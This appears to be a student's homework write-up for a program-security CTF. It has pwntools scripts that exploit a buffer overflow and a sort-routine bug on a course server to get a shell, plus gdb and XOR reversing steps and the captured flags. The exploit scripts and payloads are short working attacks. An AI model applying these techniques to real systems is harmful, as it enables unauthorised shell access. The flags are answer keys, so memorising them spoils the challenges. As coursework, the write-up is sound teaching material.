# Program Security Hw00

### HelloWorld

```
Just copy past!!

FLAG{Hello CTF}
```

### Pwn1
```python=
from pwn import *

r = remote('csie.ctf.tw', 10120)

payload = '0123456789012345678901234567890100000000'
+ '\x66\x05\x40\x00\x00\x00\x00\x00'

r.sendline(payload)
r.interactive()
```
```
Get Shell!
$ cd /home/pwn1 && cat flag

FLAG{BuFFer_0V3Rflow_is_too_easy}
```


### BubbleSort
```python=
from pwn import *

payload = '127' + '\n' + '134514048 '
 + '0 ' * 126 + '\n' + '-125\n'

r = remote('csie.ctf.tw', 10121)
r.sendline(payload)
r.interactive()
```
```
Get Shell!!
$ cd /home/BubbleSort && cat flag

FLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}
```

### Rev1
```
# Entering gdb console

$ gdb rev1
(gdb) break main
(gdb) r
(gdb) call print_flag()

FLAG{_reverse_is_fun}
```

### Rev2

查詢"Try harder" 在哪邊被使用過
之後找到一連串的xor以及cmp instruction
做Reverse之後得到flag

詳細如下

#### 0x401101
```
loc_401101:             ; uType
push    30h
push    offset Caption  ; lpCaption
push    offset aTryHarder ; "Try harder!"
push    0               ; hWnd
call    ds:MessageBoxA
mov     eax, 1

...

```

![](https://i.imgur.com/O8BPyZW.png)

#### unk_4120BC 
```
    0x8a808d8bb794fcbe93b8a3938fbef8afa79381ffb1 
    
    xor with 0xccccccc...
    
    Get flag FLAG{X0r_to_Cr4ck_M3}
```
    
